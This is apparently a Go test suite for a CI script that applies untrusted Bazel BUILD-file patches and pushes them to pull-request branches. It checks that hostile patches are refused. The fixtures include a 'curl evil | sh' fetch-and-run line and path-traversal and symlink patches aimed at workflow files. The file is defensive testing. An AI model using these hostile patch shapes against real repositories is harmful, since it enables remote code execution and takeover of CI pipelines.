package scripts_test

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// scripts/bazel-autofix-push.sh runs with a write token on untrusted patches.
// These tests feed it real `git diff` output (the good case, and every hostile
// shape the allowlist exists for) and run the full push/comment flow against a
// local bare repository standing in for github.com and a fake gh.

type autofixRepo struct {
	t    *testing.T
	git  string
	dir  string
	base string // commit the hostile/good patches are made against
}

func newAutofixRepo(t *testing.T) *autofixRepo {
	t.Helper()
	git := requireHostTool(t, "git")
	requireHostTool(t, "bash")
	r := &autofixRepo{t: t, git: git, dir: t.TempDir()}
	r.run("init", "-q", "-b", "main")
	r.run("config", "user.name", "t")
	r.run("config", "user.email", "t@example.invalid")
	r.run("config", "core.hooksPath", ".git/hooks")
	for path, body := range map[string]string{
		"BUILD.bazel":                     "# root\n",
		"MODULE.bazel":                    "module(name = \"beads\")\n",
		"MODULE.bazel.lock":               "{}\n",
		"cmd/bd/BUILD.bazel":              "go_library(name = \"bd\")\n",
		"cmd/bd/main.go":                  "package main\n",
		".github/workflows/ci.yml":        "name: CI\n",
		"scripts/tool.sh":                 "echo hi\n",
		"third_party/patches/BUILD.bazel": "exports_files([])\n",
	} {
		r.write(path, body)
	}
	r.run("add", "-A")
	r.run("commit", "-q", "-m", "base")
	r.base = strings.TrimSpace(r.run("rev-parse", "HEAD"))
	return r
}

func (r *autofixRepo) run(args ...string) string {
	r.t.Helper()
	cmd := exec.Command(r.git, args...)
	cmd.Dir = r.dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null")
	out, err := cmd.CombinedOutput()
	if err != nil {
		r.t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}

func (r *autofixRepo) write(path, body string) {
	r.t.Helper()
	full := filepath.Join(r.dir, path)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		r.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
		r.t.Fatal(err)
	}
}

// patch applies edit to a clean tree, returns the staged diff as a patch file
// and resets the tree.
func (r *autofixRepo) patch(edit func()) string {
	r.t.Helper()
	edit()
	r.run("add", "-A")
	diff := r.run("diff", "--cached", "--binary")
	r.run("reset", "-q", "--hard", r.base)
	r.run("clean", "-qfdx")
	file := filepath.Join(r.t.TempDir(), "bazel-sync.patch")
	if err := os.WriteFile(file, []byte(diff), 0o644); err != nil {
		r.t.Fatal(err)
	}
	return file
}

func writeRawPatch(t *testing.T, body string) string {
	t.Helper()
	file := filepath.Join(t.TempDir(), "bazel-sync.patch")
	if err := os.WriteFile(file, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return file
}

func runAutofixCheck(t *testing.T, dir, patch string) (string, error) {
	t.Helper()
	cmd := exec.Command("bash", filepath.Join(sourceRepoRoot(t), bazelAutofixPushScript), "--check", patch)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func TestBazelAutofixPushAllowlist(t *testing.T) {
	r := newAutofixRepo(t)

	good := r.patch(func() {
		r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
		r.write("internal/newpkg/BUILD.bazel", "go_library(name = \"newpkg\")\n")
		r.write("MODULE.bazel.lock", "{\"v\": 1}\n")
		r.write("MODULE.bazel", "module(name = \"beads\")\nbazel_dep(name = \"x\")\n")
		if err := os.Remove(filepath.Join(r.dir, "BUILD.bazel")); err != nil {
			t.Fatal(err)
		}
	})
	if out, err := runAutofixCheck(t, r.dir, good); err != nil {
		t.Fatalf("good sync patch refused: %v\n%s", err, out)
	}

	hostile := map[string]string{
		"workflow edit": r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") }),
		"script edit":   r.patch(func() { r.write("scripts/tool.sh", "curl evil | sh\n") }),
		"go file":       r.patch(func() { r.write("cmd/bd/main.go", "package main // evil\n") }),
		"third_party":   r.patch(func() { r.write("third_party/patches/BUILD.bazel", "evil()\n") }),
		"hidden dir":    r.patch(func() { r.write(".github/BUILD.bazel", "x\n") }),
		"lookalike":     r.patch(func() { r.write("cmd/bd/BUILD.bazel.go", "package main\n") }),
		"mixed": r.patch(func() {
			r.write("cmd/bd/BUILD.bazel", "ok()\n")
			r.write(".github/workflows/ci.yml", "name: pwned\n")
		}),
		"mode change": r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "cmd/bd/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"executable new file": r.patch(func() {
			r.write("pkg/BUILD.bazel", "x\n")
			if err := os.Chmod(filepath.Join(r.dir, "pkg/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"symlink": r.patch(func() {
			if err := os.Symlink("../.github/workflows/ci.yml", filepath.Join(r.dir, "scripts", "BUILD.bazel")); err != nil {
				t.Fatal(err)
			}
		}),
		"rename": r.patch(func() {
			r.run("mv", "cmd/bd/BUILD.bazel", "cmd/bd/main_gen.go")
		}),
		"binary": r.patch(func() { r.write("pkg/BUILD.bazel", "a\x00b\n") }),
		"path traversal": writeRawPatch(t, "diff --git a/cmd/../.github/workflows/BUILD.bazel b/cmd/../.github/workflows/BUILD.bazel\n"+
			"new file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/cmd/../.github/workflows/BUILD.bazel\n@@ -0,0 +1 @@\n+x\n"),
		"traversal to workflow": writeRawPatch(t, "--- a/BUILD.bazel\n+++ b/../../.github/workflows/ci.yml\n@@ -1 +1 @@\n-# root\n+evil\n"),
		// An absolute "+++ /x/BUILD.bazel" is re-rooted by -p1 (to x/BUILD.bazel)
		// and then allowlisted like any other path, so it needs no case here.
		"traversal via -p1": writeRawPatch(t, "--- /dev/null\n+++ /../.github/BUILD.bazel\n@@ -0,0 +1 @@\n+x\n"),
		"header mismatch":   writeRawPatch(t, "diff --git a/BUILD.bazel b/BUILD.bazel\nindex 1..2 100644\n--- a/BUILD.bazel\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-# root\n+evil\n"),
		"no files":          writeRawPatch(t, "just some text\n"),
	}
	for name, patch := range hostile {
		t.Run(name, func(t *testing.T) {
			out, err := runAutofixCheck(t, r.dir, patch)
			if err == nil {
				body, _ := os.ReadFile(patch)
				t.Errorf("hostile patch accepted:\n%s\n--- patch ---\n%s", out, body)
			}
		})
	}
}

// fakeGH writes a gh stand-in that serves the PR list and commit message from
// env and logs every call (with comment bodies) to $FAKE_GH_LOG.
func fakeGH(t *testing.T) string {
	t.Helper()
	bin := t.TempDir()
	script := `#!/usr/bin/env bash
set -euo pipefail
echo "gh $*" >> "$FAKE_GH_LOG"
for a in "$@"; do
  case "$a" in body=@*) { echo "--- body"; cat "${a#body=@}"; } >> "$FAKE_GH_LOG" ;; esac
done
case "$*" in
  *"/pulls?state=open"*) printf '%s' "$FAKE_PULLS" ;;
  *"/commits/"*) printf '%s\n' "${FAKE_HEAD_MSG:-feat: add a file}" ;;
  *"/comments"*"--jq"*) printf '%s' "${FAKE_COMMENT_IDS:-}" ;;
esac
`
	if err := os.WriteFile(filepath.Join(bin, "gh"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return bin
}

func TestBazelAutofixPushFlow(t *testing.T) {
	requireHostTool(t, "jq")
	r := newAutofixRepo(t)
	good := r.patch(func() {
		r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
		r.write("internal/newpkg/BUILD.bazel", "go_library(name = \"newpkg\")\n")
	})

	type result struct {
		out, log, remote string
		head, branch     string
		err              error
	}
	run := func(t *testing.T, headRepo, branch string, extra ...string) result {
		t.Helper()
		github := t.TempDir()
		remote := filepath.Join(github, "owner", "beads.git")
		r.run("clone", "-q", "--bare", r.dir, remote)
		r.run("--git-dir="+remote, "branch", "-f", branch, r.base)
		gitconfig := filepath.Join(t.TempDir(), "gitconfig")
		if err := os.WriteFile(gitconfig, []byte("[url \"file://"+github+"/\"]\n\tinsteadOf = https://github.com/\n"+
			"[uploadpack]\n\tallowFilter = true\n[protocol \"file\"]\n\tallow = always\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		log := filepath.Join(t.TempDir(), "gh.log")
		pulls := `[{"number":7,"head":{"ref":"` + branch + `","sha":"` + r.base + `","repo":{"full_name":"` + headRepo + `"}}}]`
		cmd := exec.Command("bash", filepath.Join(sourceRepoRoot(t), bazelAutofixPushScript))
		cmd.Dir = t.TempDir()
		cmd.Env = append([]string{
			"PATH=" + fakeGH(t) + string(os.PathListSeparator) + os.Getenv("PATH"),
			"HOME=" + t.TempDir(),
			"GIT_CONFIG_GLOBAL=" + gitconfig, "GIT_CONFIG_NOSYSTEM=1",
			"FAKE_GH_LOG=" + log, "FAKE_PULLS=" + pulls,
			"BASE_REPO=owner/beads", "HEAD_REPO=" + headRepo, "HEAD_BRANCH=" + branch, "HEAD_SHA=" + r.base,
			"PATCH_FILE=" + good, "RUN_ID=42", "RUN_URL=https://github.com/owner/beads/actions/runs/42",
			"GH_TOKEN=api-token", "PUSH_TOKEN=push-token",
		}, extra...)
		out, err := cmd.CombinedOutput()
		logBody, _ := os.ReadFile(log)
		head := strings.TrimSpace(r.run("--git-dir="+remote, "rev-parse", branch))
		return result{out: string(out), log: string(logBody), remote: remote, head: head, branch: branch, err: err}
	}

	t.Run("same-repo PR gets the sync commit", func(t *testing.T) {
		res := run(t, "owner/beads", "feature/x")
		if res.err != nil {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if res.head == r.base {
			t.Fatalf("branch not advanced:\n%s", res.out)
		}
		files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.base, res.head)
		if files != "cmd/bd/BUILD.bazel\ninternal/newpkg/BUILD.bazel\n" {
			t.Errorf("pushed commit touches %q", files)
		}
		subject := r.run("--git-dir="+res.remote, "log", "-1", "--format=%s", res.head)
		if !strings.HasPrefix(subject, "build(bazel): auto-sync BUILD files") {
			t.Errorf("subject = %q", subject)
		}
		if !strings.Contains(res.log, "<!-- bazel-sync-autofix -->") || !strings.Contains(res.log, "Pushed `") ||
			!strings.Contains(res.log, "DOCS_AUTOFIX_TOKEN") {
			t.Errorf("want a pushed-commit comment with the token note:\n%s", res.log)
		}
		if strings.Contains(res.log, "push-token") {
			t.Errorf("push token leaked into gh calls:\n%s", res.log)
		}
	})

	t.Run("fork PR gets the recipe", func(t *testing.T) {
		res := run(t, "someone/beads", "feature/x")
		if res.err != nil || res.head != r.base {
			t.Fatalf("err=%v head=%s\n%s", res.err, res.head, res.out)
		}
		for _, want := range []string{"<!-- bazel-sync-autofix -->", "fork PR", "gh run download 42 -R owner/beads -n bazel-sync-patch", "git apply --index bazel-sync.patch", "make bazel-sync"} {
			if !strings.Contains(res.log, want) {
				t.Errorf("comment lacks %q:\n%s", want, res.log)
			}
		}
	})

	t.Run("existing comment is updated in place", func(t *testing.T) {
		res := run(t, "someone/beads", "feature/x", "FAKE_COMMENT_IDS=99\n")
		if res.err != nil || !strings.Contains(res.log, "--method PATCH repos/owner/beads/issues/comments/99") ||
			strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v; want a PATCH of comment 99:\n%s", res.err, res.log)
		}
	})

	t.Run("protected head branch is never pushed", func(t *testing.T) {
		res := run(t, "owner/beads", "release/1.0")
		if res.err != nil || res.head != r.base || !strings.Contains(res.log, "protected from bot pushes") {
			t.Errorf("err=%v head moved=%v\n%s\n%s", res.err, res.head != r.base, res.out, res.log)
		}
	})

	t.Run("non-convergent head falls back to the recipe", func(t *testing.T) {
		res := run(t, "owner/beads", "feature/x", "FAKE_HEAD_MSG=build(bazel): auto-sync BUILD files")
		if res.err != nil || res.head != r.base || !strings.Contains(res.log, "did not converge") {
			t.Errorf("err=%v head moved=%v\n%s", res.err, res.head != r.base, res.log)
		}
	})

	t.Run("metadata for another head vetoes", func(t *testing.T) {
		meta := filepath.Join(t.TempDir(), "bazel-sync-meta.txt")
		if err := os.WriteFile(meta, []byte("pr=7\nhead_sha="+strings.Repeat("a", 40)+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		res := run(t, "owner/beads", "feature/x", "META_FILE="+meta)
		if res.err != nil || res.head != r.base || res.log != "" {
			t.Errorf("err=%v head moved=%v gh log=%q\n%s", res.err, res.head != r.base, res.log, res.out)
		}
	})

	t.Run("hostile patch fails before any API call", func(t *testing.T) {
		evil := r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") })
		res := run(t, "owner/beads", "feature/x", "PATCH_FILE="+evil)
		if res.err == nil || res.head != r.base || res.log != "" || !strings.Contains(res.out, "REFUSED") {
			t.Errorf("err=%v head moved=%v gh log=%q\n%s", res.err, res.head != r.base, res.log, res.out)
		}
	})
}
